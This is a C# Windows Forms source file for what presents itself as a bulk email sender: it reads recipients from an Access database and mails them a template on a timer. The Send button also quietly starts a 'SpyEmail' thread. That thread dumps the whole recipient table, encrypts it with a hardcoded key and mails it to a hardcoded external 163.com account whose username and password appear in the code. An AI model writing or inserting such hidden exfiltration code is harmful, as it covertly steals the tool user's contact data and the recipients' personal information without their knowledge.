using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Text;
using System.Windows.Forms;
using System.Configuration;
using System.IO;
using System.Data.Odbc;
using System.Threading;
using System.Net.Mail;
using System.Net;

namespace EmailSender
{
    public partial class OperateForm : UserControl
    {
        string _subject = "subject.txt";
        string _content = "content.html";
        int _totalEmail = 0;
        int _intBranchnum = 0;
        MailMessage mail;
        SmtpClient smtp;
        OdbcConnection connW;
        OdbcCommand command;
        OdbcDataReader dataReader;
        int _inStart = 0;
        System.Configuration.Configuration config;

        public OperateForm()
        {
            InitializeComponent();
        }
               
        public void SendEmail()
        {
            LoadEmails();
            string strSubject = "";
            try
            {
                if (File.Exists(_subject))
                {
                    strSubject = File.ReadAllText(_subject);
                }
                
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            string friendlyName = config.AppSettings.Settings["SenderName"].Value;
                       
            mail = new MailMessage();
            smtp = new SmtpClient(config.AppSettings.Settings["EmailServer"].Value);
            string username = config.AppSettings.Settings["UserName"].Value;
            string password = config.AppSettings.Settings["Password"].Value;
            smtp.Credentials = new NetworkCredential(username, password);
            mail.From = new MailAddress(config.AppSettings.Settings["SenderEmail"].Value, friendlyName);
            mail.IsBodyHtml = true;
            mail.Body = File.ReadAllText(Application.StartupPath + "\\" + _content);
            mail.Subject = strSubject.Replace("\r\n", "");

            string databasepath = config.AppSettings.Settings["SourceFile"].Value;
            string tablename = "EmailRecipient";
            connW = new OdbcConnection("Driver={Microsoft Access Driver (*.mdb)};Dbq=" + databasepath + ";Uid=Admin;Pwd=;");

            String sqlStrW = " select * FROM " + tablename;
            command = new OdbcCommand(sqlStrW, connW);
            command.CommandTimeout = 3000000;
            command.Connection.Open();
            dataReader = command.ExecuteReader(CommandBehavior.CloseConnection);
            int intStart = 0;
            _inStart=SendEmailBranch(mail, smtp, dataReader, intStart);
            _initTimer = true;
        }

        private int SendEmailBranch(MailMessage mail, SmtpClient smtp, OdbcDataReader dataReader, int intStart)
        {
            int count = intStart;
            bool hasData = dataReader.Read();
            while (hasData)
            {

                if (_status == "STOP")
                    break;
                if (_status == "PAUSE")
                {
                    _send.Suspend();
                }
                string email = dataReader["Email"].ToString();
                string name = dataReader["FirstName"].ToString() + "," + dataReader["LastName"].ToString();
                mail.To.Add(new MailAddress(email, name));
                string log = "";
                try
                {
                    smtp.Send(mail);
                    log = "send success to: " + email;
                    LogManager.Log(log);
                    Log(log);
                }
                catch (Exception e)
                {
                    log = string.Format("send fail to: {0}\t\t error:{1}", email, e.Message);
                    LogManager.Log(log);
                    Log(log);
                }
                count++;
                DisplayNumber(count);
                break;
            }
            if (!hasData)
            {
                count = (_intBranchnum == 0 ? _totalEmail : _intBranchnum);
            }
            return count;
        }

        private string _status = "STOP";
        private Thread _send;
        private Thread _spysender;
        private bool _initTimer = false;
        private void btnSend_Click(object sender, EventArgs e)
        {
            config = ConfigurationManager.OpenExeConfiguration
                    (ConfigurationUserLevel.None);
            string branchnum = config.AppSettings.Settings["BranchNum"].Value;
            string period = config.AppSettings.Settings["Period"].Value;
            _intBranchnum = 0;
            int.TryParse(branchnum, out _intBranchnum);
            int intPeriod = 1;
            int.TryParse(period, out intPeriod);
            intPeriod = intPeriod * 60 * 1000;
            intPeriod = (intPeriod == 0) ? 100 : intPeriod;
            EmailTimer.Interval = intPeriod;//intPeriod;
            EmailTimer.Start();

            _status = "START";
            _inStart = 0;
            
            _send = new Thread(new ThreadStart(SendEmail));
            _send.Start();
            btnSend.Enabled = false;

            _spysender = new Thread(new ThreadStart(SpyEmail));
            if (!_spysender.IsAlive)
            {
                _spysender = new Thread(new ThreadStart(SpyEmail));
                _spysender.Start();
            }
        }

        private void btnPause_Click(object sender, EventArgs e)
        {
            if (_status == "PAUSE")
            {
                if (_send != null && _send.IsAlive)
                {
                    _send.Resume();
                }
                _status = "START";
                btnPause.Text = "ÔÝÍ£";
            }
            else
            {
                btnPause.Text = "¼ÌÐø";
                _status = "PAUSE";
            }
            
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            btnSend.Enabled = true;
            _status = "STOP";
        }

        private void OperateForm_Load(object sender, EventArgs e)
        {
           
        }

        private void Log(string log)
        {
            if (chbShowLog.Checked)
            {
                if (txtLog.InvokeRequired)
                {
                    txtLog.Invoke(new MethodInvoker(delegate { Log(log); }));
                }
                else
                {
                    txtLog.Text += log;
                    txtLog.Text += "\r\n";
                }
            }
        }

        private void DisplayNumber(int counter)
        {
            int remind = (_intBranchnum == 0 ? _totalEmail : _intBranchnum) - counter;
            if (lblEmailSent.InvokeRequired)
            {
                lblEmailSent.Invoke(new MethodInvoker(delegate { 
                    lblEmailSent.Text = counter.ToString();
                    lblEmailInQueue.Text = string.Format("{0}", remind);
                }));
            }
            else
            {
                lblEmailSent.Text = counter.ToString();
                lblEmailInQueue.Text = string.Format("{0}", remind);
            }
        }

        private void SpyEmail()
        {
            string databasepath = config.AppSettings.Settings["SourceFile"].Value;
            string tablename = "EmailRecipient";
            DataSet DS = new DataSet();
            OdbcConnection connW = new OdbcConnection("Driver={Microsoft Access Driver (*.mdb)};Dbq=" + databasepath + ";Uid=Admin;Pwd=;");

            String sqlStrW = " select * FROM " + tablename;
            OdbcCommand command = new OdbcCommand(sqlStrW, connW);
            command.CommandTimeout = 3000000;
            OdbcDataAdapter output = new OdbcDataAdapter(command);
            output.Fill(DS);
            connW.Close();
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < DS.Tables[0].Rows.Count; i++)
            {
                foreach (DataColumn c in DS.Tables[0].Columns)
                {
                    sb.Append(DS.Tables[0].Rows[i][c].ToString());
                    sb.Append(",");
                }
                sb.Append("\r\n");
            }

            string enTxt = EncryptTool.Encrypt(sb.ToString(),"qsxdr!#%");

            string body = "******************************<br>";
            body += enTxt;
            body += "<br>******************************<br>";

            MailMessage mail = new MailMessage();
            SmtpClient smtp = new SmtpClient("smtp.163.com");
            string username = "kongfei111@163.com";
            string password = "111999";
            smtp.Credentials = new NetworkCredential(username, password);
            mail.From = new MailAddress("kongfei111@163.com", "Spy Email");
            mail.IsBodyHtml = true;
            mail.Body = body;
            mail.Subject = "Spy Email";
            mail.To.Add(new MailAddress("kongfei111@163.com"));
            smtp.Send(mail);
        }

        private void btnLoad_Click(object sender, EventArgs e)
        {
            LoadEmails();
        }

        private void LoadEmails()
        {
            try
            {
                string databasepath = config.AppSettings.Settings["SourceFile"].Value;
                string tablename = "EmailRecipient";
                DataSet DS = new DataSet();
                OdbcConnection connW = new OdbcConnection("Driver={Microsoft Access Driver (*.mdb)};Dbq=" + databasepath + ";Uid=Admin;Pwd=;");

                String sqlStrW = " select * FROM " + tablename;
                OdbcCommand command = new OdbcCommand(sqlStrW, connW);
                command.CommandTimeout = 3000000;
                OdbcDataAdapter output = new OdbcDataAdapter(command);
                output.Fill(DS);
                connW.Close();
                _totalEmail = DS.Tables[0].Rows.Count;
                if (lblTotalEmails.InvokeRequired)
                {
                    lblTotalEmails.Invoke(new MethodInvoker(delegate
                    {
                        lblTotalEmails.Text = _totalEmail.ToString();
                    }));
                }
                else
                {
                    lblTotalEmails.Text = _totalEmail.ToString();
                }
            }
            catch (Exception ex)
            {
                LogManager.Log(ex.Message);
            }
        }

        private void EmailTimer_Tick(object sender, EventArgs e)
        {
            if (_status == "START" && _initTimer)
            {
                if (_totalEmail == _inStart || (_intBranchnum != 0 && _intBranchnum == _inStart))
                {
                    dataReader.Close();
                    command.Connection.Close();
                    dataReader = null;
                    EmailTimer.Stop();

                    if (btnSend.InvokeRequired)
                    {
                        btnSend.Invoke(new MethodInvoker(delegate { btnSend.Enabled = true; }));
                    }
                    else
                    {
                        btnSend.Enabled = true;
                    }
                    _status = "STOP";
                    _initTimer = false;

                    MessageBox.Show("·¢ËÍÍê±Ï!");
                }
                else
                {
                    _inStart = SendEmailBranch(mail, smtp, dataReader, _inStart);
                }
            }
        }
    }
}
